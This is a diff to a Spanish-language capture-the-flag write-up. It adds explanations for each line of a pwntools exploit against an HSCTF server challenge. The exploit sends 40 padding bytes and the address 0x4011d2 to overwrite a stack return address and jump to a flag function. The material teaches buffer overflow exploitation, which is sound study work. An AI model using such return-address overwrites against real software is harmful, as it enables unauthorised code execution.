@@ -128,6 +128,14 @@ conexion.recv()
 conexion.sendline(b'Q')
 print(conexion.recv())
 ~~~
+Donde:  
+
+ - `conexion = remote("ed.hsctf.com", 1337)`: Establece una conexión al servidor remoto.
+ - `direccion_funcion_flag = p64(0x4011d2)`: Convierte la dirección hexadecimal 0x4011d2 en una cadena de 8 bytes (64 bits) utilizando la función `p64`. 
+ - `conexion.sendline(b'a'*offset + direccion_funcion_flag)`: Envía una cadena al servidor que consta de 40 caracteres 'a' seguidos de la dirección de la función que queremos ejecutar, sobrescribiendo la dirección de retorno en la pila con la dirección de la función que queremos ejecutar.
+ - `conexion.recv()`: Se recibe y descarta cualquier respuesta del servidor. Necesario para que el programa remoto procese completamente la entrada anterior.
+ - `conexion.sendline(b'Q')`: Envía el carácter 'Q' al servidor. Esto provoca que el programa remoto retorne, provocando que salte a la dirección de la función que hemos inyectado en la pila.
+ - `print(conexion.recv())`: Recibe y luego imprime la respuesta final del servidor.
 
 Lo ejecutamos y conseguimos la bandera:
 
